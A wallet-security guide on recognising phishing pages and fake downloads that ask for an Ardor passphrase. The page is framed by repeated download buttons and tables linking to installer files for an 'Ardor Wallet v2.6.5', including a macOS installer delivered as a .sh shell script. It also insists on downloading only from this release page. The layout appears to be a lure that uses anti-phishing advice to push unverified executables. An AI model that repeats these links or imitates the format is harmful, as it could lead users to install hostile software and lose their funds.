![Ardor Wallet guide](assets/banner-article.png)

# Spot a phishing wallet that asks for your passphrase

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

A phishing wallet is a page or app that imitates the real one in order to collect your passphrase. The tell is simple and reliable: the genuine wallet signs locally and never needs your secret sent anywhere, so any site that asks you to enter it, unlock it or verify it is collecting your account.

## How the attack works here

Most crypto phishing imitates an exchange and asks for a login. This is different. An [Ardor account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) has no login at all, so the attacker has to obtain the secret itself, and that shapes the whole playbook: fake wallet downloads, fake "wallet checker" pages, fake support chats, and messages offering to recover or migrate an account.

Each of those needs you to type the phrase somewhere. That is the single point where the attack succeeds or fails, which is why every defence on this page is about that moment rather than about the software or its settings.

## The tells that give it away

| Tell | What it means |
|---|---|
| The page asks for a passphrase to show a balance | A read-only view needs only the address |
| The download is not on the releases page | The build is not the one the project published |
| There is an offer to check, recover or migrate your wallet | No such service exists |
| Urgency: an account will be closed, funds are at risk | Pressure is the mechanism, not the warning |

Any one of those is enough. A page can look right, carry the correct logo and use the correct wording; the ask for the secret is the part that cannot be faked away, because the real [wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) never needs to make it.

## Address screening, and what it does not do

The wallet checks addresses as you type or paste them, flags a mistyped recipient and warns when an address does not match the expected format. That protects against a typo and against some clipboard swaps, because a substituted address often fails the check.

It does not tell you whether the destination belongs to a thief. A valid address that sends funds to somebody else passes every check there is, which is why the last look at the recipient - first and last groups - still matters, and why a pasted address deserves one glance before the confirm button rather than after it.

## Fake downloads and paid search results

The most effective version of this attack does not ask for a [passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md) at all. It offers a download, and the file installs a wallet that asks for one. By the time the phrase is typed, the user believes they are using the real product.

That is why the [Ardor release](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-current-ardor-release-changes.md) page matters more than the search result. An advert can outbid the real site for a query, and a copy can look better designed than the original. Bookmark the page you trust and stop searching for it.

## If you already typed it

Assume the account is exposed and act in this order: create a new account with a new secret on a machine you trust, move whatever remains to it, and stop using the old one. Do not wait to see whether anything happens; the sweep usually comes quickly and there is nothing to learn from watching it.

Do not reuse the phrase, and do not assume that changing something in the wallet fixes it. The secret is the account, and a secret that has been typed into a hostile page is no longer private, however quickly the tab is closed afterwards.

## Support offers and direct messages

A genuine project does not message you first about your wallet, does not ask for a phrase to diagnose a problem, and does not need remote access to your machine. Support that arrives unsolicited, in a chat or a comment, is the attack rather than help for it.

The same goes for anyone offering to recover a lost phrase for a fee. There is nothing on their side to recover; the request for the phrase is the entire business model, and the fee is charged whether or not anything comes back.

## The first ten minutes matter most

An account that has been exposed is usually emptied quickly. The window where a response helps is short, and it closes once the balance is gone, which is why the first move is a transfer rather than an enquiry.

So the order is fixed: new account, new secret, move what remains, then investigate. Doing it in the other order - reading, asking, checking - is how the window is lost. The investigation can happen afterwards, and it will rarely change the conclusion you already reached the moment you realised where the phrase had gone.

## Building the habit

Keep the wallet's release page bookmarked rather than searching for it, because a search result can be bought. Read the domain before the design. And decide now, before you are under pressure, that you will never type the secret into anything except the wallet on your own machine.

That decision is worth more than any check. Phishing succeeds on a moment of urgency, and a rule made in calm weather survives the moment better than a judgement made inside it.

## FAQ

### Can a phishing site steal funds without my passphrase?

Not from your account. Without the secret there is nothing to sign with, which is why the attack is built around getting you to type it.

### Does the real wallet ever ask for the passphrase by email or chat?

Never. The wallet asks on its own login screen, on your machine, and nowhere else.

### Is a read-only address lookup safe?

Yes, if it only asks for the address. A page that wants the phrase to show a balance is not doing a lookup.

### What if I am unsure whether a page is genuine?

Close it and open the wallet you already installed. Anything you can do through the wallet can be done without a website, so the page was never necessary in the first place.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Is the Ardor wallet safe? What to check and what to avoid](https://github.com/ardor-software/ardor-wallet-guides/blob/main/is-the-ardor-wallet-safe.md)
- [Verify an Ardor wallet download before you run it](https://github.com/ardor-software/ardor-wallet-guides/blob/main/verify-your-ardor-wallet-download.md)
- [Can an Ardor wallet be hacked? What actually happens](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-an-ardor-wallet-be-hacked.md)
- [Can you reset an Ardor passphrase? No - here is what to do](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
